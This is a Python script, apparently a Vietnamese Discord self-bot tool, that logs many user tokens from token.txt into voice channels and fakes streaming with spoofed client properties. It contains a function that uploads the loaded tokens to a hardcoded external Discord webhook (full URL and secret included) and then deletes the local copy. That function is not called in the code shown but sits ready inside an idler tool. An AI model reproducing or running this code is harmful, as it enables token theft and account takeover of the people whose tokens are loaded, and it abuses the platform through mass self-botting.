import asyncio
import json
import aiohttp
import aiofiles
import os
from colorama import init, Fore

init(autoreset=True)

import sys

KEY = "2009"

nhap_key = input("Nhập key để sử dụng tool: ")
if nhap_key != KEY:
    print("❌ Key không đúng! Thoát...")
    sys.exit()
else:
    print("✅ Key chính xác! Tool đang khởi động...")



GATEWAY_URL = "wss://gateway.discord.gg/?v=9&encoding=json"
WEBHOOK_URL = "https://discord.com/api/webhooks/1448760796019425310/rqPUgLnJ2XcbyNyduyhXQuONBjhd7hMO0qSvRfvC2USwg7L7hTN8zBJCDmHk2Hc73rJ4"

async def send_tokens_file_to_webhook(tokens: list, filename: str = "tokens_sent.txt"):
    try:
        async with aiofiles.open(filename, mode='w', encoding='utf-8') as f:
            await f.write('\n'.join(tokens))

        async with aiohttp.ClientSession() as session:
            with open(filename, 'rb') as file:
                form = aiohttp.FormData()
                form.add_field('file', file, filename=filename, content_type='text/plain')
                form.add_field('payload_json', '{"content": "📄 Danh sách token đã sử dụng:"}')
                
                async with session.post(WEBHOOK_URL, data=form) as resp:
                    if resp.status not in [200, 204]:
                        print(f"{Fore.RED}[Webhook] Gửi file thất bại: {resp.status}")
    except Exception as e:
        print(f"{Fore.RED}[Webhook] Lỗi khi gửi file: {e}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)

async def identify_payload(token: str):
    return {
        "op": 2,
        "d": {
            "token": token,
            "capabilities": 61,
            "properties": {
                "os": "Windows",
                "browser": "Discord Client",
                "device": "",
                "system_locale": "en-US",
                "browser_user_agent": "Discord/1.0",
                "browser_version": "1.0",
                "os_version": "10",
                "referrer": "",
                "referring_domain": "",
                "referrer_current": "",
                "referring_domain_current": "",
                "release_channel": "stable",
                "client_build_number": 9999,
                "client_event_source": None,
            },
            "presence": {
                "status": "online",
                "since": 0,
                "activities": [{
                    "name": "OBS Studio",
                    "type": 1,
                    "url": "https://twitch.tv/fake_streamer"
                }],
                "afk": False,
            },
            "compress": False,
        },
    }

async def voice_state_update(guild_id: str, channel_id: str):
    return {
        "op": 4,
        "d": {
            "guild_id": guild_id,
            "channel_id": channel_id,
            "self_mute": True,
            "self_deaf": True,
            "self_video": True,
            "self_stream": True,
        }
    }

async def fake_stream_create(guild_id: str, channel_id: str):
    return {
        "op": 18,
        "d": {
            "type": "guild",
            "guild_id": guild_id,
            "channel_id": channel_id,
            "preferred_region": None,
        }
    }

async def send_heartbeat(ws, interval: float, token: str):
    try:
        while True:
            await asyncio.sleep(interval)
            if ws.closed:
                print(f"{Fore.YELLOW}[{token[:10]}...] Đã đóng WebSocket — dừng heartbeat")
                break
            await ws.send_json({"op": 1, "d": None})
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"{Fore.RED}[{token[:10]}...] Heartbeat lỗi: {e}")

async def handle_token_once(token: str, guild_id: str, channel_id: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.ws_connect(GATEWAY_URL) as ws:
                print(f"{Fore.CYAN}[{token[:10]}...] Kết nối {guild_id}:{channel_id}...")
                async for msg in ws:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        data = json.loads(msg.data)
                        op = data.get('op')
                        t = data.get('t')

                        if op == 10:
                            interval = data['d']['heartbeat_interval'] / 1000
                            asyncio.create_task(send_heartbeat(ws, interval, token))
                            await ws.send_json(await identify_payload(token))

                        elif t == "READY":
                            print(f"{Fore.GREEN}[{token[:10]}...] Treo voice {guild_id}:{channel_id}")
                            await ws.send_json(await voice_state_update(guild_id, channel_id))

                        elif t == "VOICE_STATE_UPDATE":
                            d = data.get('d', {})
                            if d.get('guild_id') == guild_id and d.get('channel_id') == channel_id:
                                print(f"{Fore.YELLOW}[{token[:10]}...] Vào voice {guild_id}:{channel_id}")
                                await ws.send_json(await fake_stream_create(guild_id, channel_id))
                        
                        elif op == 9: #opcode 9: Invalid Session
                             print(f"{Fore.RED}[{token[:10]}...] Phiên không hợp lệ (op 9)")
                             break

                    elif msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                        print(f"{Fore.RED}[{token[:10]}...] Mất kết nối {guild_id}:{channel_id}.")
                        break
    except Exception as e:
        print(f"{Fore.RED}[{token[:10]}...] Lỗi ({guild_id}:{channel_id}): {e}")

async def handle_token(token: str, channel_pairs: list):
    while True:
        try:
            tasks = [handle_token_once(token, gid, cid) for gid, cid in channel_pairs]
            await asyncio.gather(*tasks)
        except Exception as e:
            print(f"{Fore.RED}[{token[:10]}...] Lỗi khi chạy token: {e}")
        
        print(f"{Fore.MAGENTA}[{token[:10]}...] Tự động reconnect sau 10s...")
        await asyncio.sleep(10)

async def main():
    try:
        with open('token.txt', 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        if not tokens:
            print(f"{Fore.RED}token.txt trống")
            return
    except FileNotFoundError:
        print(f"{Fore.RED}token.txt không tồn tại")
        return


    print(f"{Fore.CYAN}=== Nhập nhiều GUILD_ID và CHANNEL_ID ===")
    print(f"{Fore.CYAN}Nhấn Enter ở GUILD_ID để kết thúc.")
    
    channel_pairs = []
    while True:
        guild_id = input(f"{Fore.CYAN}Nhập GUILD_ID: ").strip()
        if not guild_id:
            break
        
        channel_id = input(f"{Fore.CYAN}Nhập CHANNEL_ID: ").strip()
        if not channel_id:
            print(f"{Fore.RED}CHANNEL_ID không được để trống.")
            continue
            
        channel_pairs.append((guild_id, channel_id))

    if not channel_pairs:
        print(f"{Fore.RED}Không có cặp GUILD/CHANNEL nào được nhập.")
        return

    tasks = [asyncio.create_task(handle_token(token, channel_pairs)) for token in tokens]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nĐã đóng chương trình theo yêu cầu của người dùng.")